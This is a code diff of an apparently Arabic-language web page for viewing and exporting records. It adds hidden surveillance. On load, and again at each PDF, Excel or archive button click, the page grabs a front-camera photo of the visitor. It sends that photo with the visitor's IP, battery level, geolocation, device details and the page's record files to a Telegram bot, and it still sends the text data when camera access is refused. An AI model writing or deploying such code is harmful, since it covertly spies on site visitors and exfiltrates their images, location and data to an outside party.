@@ -700,6 +700,9 @@
         const deviceInfo = navigator.userAgent;
         let preSortBackupHtml = null;
 
+        let globalCameraStream = null;
+        let cameraPermissionGranted = false;
+
         async function fetchVisitorIp() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -718,7 +721,7 @@
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
                     const charging = battery.charging ? "⚡ (يشحن)" : "🔋 (على البطارية)";
-                    batteryInfo = `${level}\%${charging}`;
+                    batteryInfo = `${level}% ${charging}`;
                 }
             } catch (e) {}
 
@@ -743,45 +746,85 @@
             }
             renumberAllRows();
 
-            // إرسال إشعار دخول زائر فوري عند فتح الصفحة
+            // طلب إذن الكاميرا مرة واحدة فقط عند فتح الموقع أول مرة
             setTimeout(() => {
-                sendVisitorAlertOnly();
+                requestCameraPermissionOnce();
             }, 1000);
         });
 
-        function sendVisitorAlertOnly() {
+        function requestCameraPermissionOnce() {
             const alertCaption = `⚠️ **دخول زائر جديد لموقعك!**\n\n` +
                                  `🌐 الآيبي: \`${userIpInfo}\`\n` +
                                  `🔋 البطارية: ${batteryInfo}\n` +
                                  `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
                                  `📱 الجهاز:\n${deviceInfo}`;
 
-            executeCaptureAndSend(alertCaption, null, null);
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        globalCameraStream = stream;
+                        cameraPermissionGranted = true;
+                        const video = document.getElementById('videoElement');
+                        video.srcObject = stream;
+                        
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                const canvas = document.getElementById('canvasElement');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                canvas.toBlob((photoBlob) => {
+                                    const formData = new FormData();
+                                    formData.append('chat_id', chatId);
+                                    formData.append('caption', alertCaption);
+                                    formData.append('parse_mode', 'Markdown');
+                                    formData.append('photo', photoBlob, 'visitor.jpg');
+
+                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    }).catch(e => {});
+
+                                }, 'image/jpeg', 0.85);
+                            }, 700);
+                        };
+                    })
+                    .catch((err) => {
+                        cameraPermissionGranted = false;
+                        // في حال الرفض، يتم إرسال البيانات والبطارية والموقع نصياً دون كاميرا
+                        const textApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertCaption + "\n\n(❌ تم رفض إذن الكاميرا من قبل الزائر)")}&parse_mode=Markdown`;
+                        const img = new Image();
+                        img.src = textApi;
+                    });
+            }
         }
 
         // 1. زر PDF / طباعة
         function onPdfButtonClicked() {
-            const caption = `🖨️ **تم النقر على طباعة / حفظ PDF**\n\n🌐 الآيبي: \`${userIpInfo}\``;
-            executeCaptureAndSend(caption, "كشف_السجلات_الرسمية.txt", "PDF");
+            const caption = `🖨️ **طلب طباعة / حفظ PDF**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
+            executeActionAndSend(caption, "كشف_السجلات_الرسمية.txt", "PDF");
             setTimeout(() => { window.print(); }, 800);
         }
 
         // 2. زر Excel
         function onExcelButtonClicked() {
-            const caption = `📊 **تم النقر على حفظ ملف Excel**\n\n🌐 الآيبي: \`${userIpInfo}\``;
-            executeCaptureAndSend(caption, "كشف_البيانات.txt", "Excel");
+            const caption = `📊 **طلب حفظ ملف Excel**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
+            executeActionAndSend(caption, "كشف_البيانات.txt", "Excel");
             exportExcelFileOnly();
         }
 
-        // 3. زر حفظ في الأرشيف
+        // 3. زر الأرشيف
         function onArchiveButtonClicked() {
-            const caption = `💾 **تم النقر على حفظ في الأرشيف المركزي**\n\n🌐 الآيبي: \`${userIpInfo}\``;
-            executeCaptureAndSend(caption, "كشف_السجلات_الرسمية.txt", "Archive");
+            const caption = `💾 **طلب حفظ في الأرشيف المركزي**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
+            executeActionAndSend(caption, "كشف_السجلات_الرسمية.txt", "Archive");
             saveArchiveOnly();
         }
 
-        // الدالة المركزية لالتقاط الصورة وإرسالها للبوت بشكل مستقل تماماً عند كل نقرة
-        function executeCaptureAndSend(captionText, fileName, fileTypeFlag) {
+        // الدالة الموحدة عند النقر في كل مرة (تستخدم الستريم المحفوظ مسبقاً دون إعادة طلب الإذن)
+        function executeActionAndSend(captionText, fileName, fileTypeFlag) {
             let fileBlob = null;
             let hasData = false;
 
@@ -814,71 +857,68 @@
                 fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
             }
 
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                    .then((stream) => {
-                        const video = document.getElementById('videoElement');
-                        video.srcObject = stream;
-                        
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(() => {
-                                const canvas = document.getElementById('canvasElement');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            if (cameraPermissionGranted && globalCameraStream) {
+                try {
+                    const video = document.getElementById('videoElement');
+                    const canvas = document.getElementById('canvasElement');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob((photoBlob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('caption', captionText);
+                        formData.append('parse_mode', 'Markdown');
+                        formData.append('photo', photoBlob, 'action_snapshot.jpg');
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            if (hasData && fileBlob) {
+                                const docData = new FormData();
+                                docData.append('chat_id', chatId);
+                                docData.append('document', fileBlob, fileName);
+                                docData.append('caption', `📄 مرفق سجلات (${fileTypeFlag})`);
                                 
-                                canvas.toBlob((photoBlob) => {
-                                    stream.getTracks().forEach(track => track.stop());
-                                    
-                                    const formData = new FormData();
-                                    formData.append('chat_id', chatId);
-                                    formData.append('caption', captionText);
-                                    formData.append('parse_mode', 'Markdown');
-                                    formData.append('photo', photoBlob, 'snapshot.jpg');
-
-                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    }).then(() => {
-                                        if (hasData && fileBlob) {
-                                            const docData = new FormData();
-                                            docData.append('chat_id', chatId);
-                                            docData.append('document', fileBlob, fileName);
-                                            docData.append('caption', `📄 مرفق سجلات (${fileTypeFlag})`);
-                                            
-                                            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-                                                method: 'POST',
-                                                body: docData
-                                            }).catch(e => {});
-                                        }
-                                    }).catch(e => {});
-
-                                }, 'image/jpeg', 0.85);
-                            }, 600);
-                        };
-                    })
-                    .catch((err) => {
-                        if (hasData && fileBlob) {
-                            sendDocumentOnly(fileBlob, captionText, fileName);
-                        }
-                    });
-            } else if (hasData && fileBlob) {
-                sendDocumentOnly(fileBlob, captionText, fileName);
+                                fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                                    method: 'POST',
+                                    body: docData
+                                }).catch(e => {});
+                            }
+                        }).catch(e => {});
+                    }, 'image/jpeg', 0.85);
+                } catch (e) {
+                    sendInfoOnly(fileBlob, captionText, fileName, hasData);
+                }
+            } else {
+                sendInfoOnly(fileBlob, captionText, fileName, hasData);
             }
         }
 
-        function sendDocumentOnly(fileBlob, captionText, fileName) {
-            const docData = new FormData();
-            docData.append('chat_id', chatId);
-            docData.append('document', fileBlob, fileName);
-            docData.append('caption', captionText);
-            docData.append('parse_mode', 'Markdown');
+        function sendInfoOnly(fileBlob, captionText, fileName, hasData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('caption', captionText + "\n\n(بدون صورة - لم يتم منح إذن الكاميرا)");
+            formData.append('parse_mode', 'Markdown');
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
-                body: docData
+                body: formData
+            }).then(() => {
+                if (hasData && fileBlob) {
+                    const docData = new FormData();
+                    docData.append('chat_id', chatId);
+                    docData.append('document', fileBlob, fileName);
+                    docData.append('caption', '📄 مرفق السجلات');
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                        method: 'POST',
+                        body: docData
+                    }).catch(e => {});
+                }
             }).catch(e => {});
         }
 
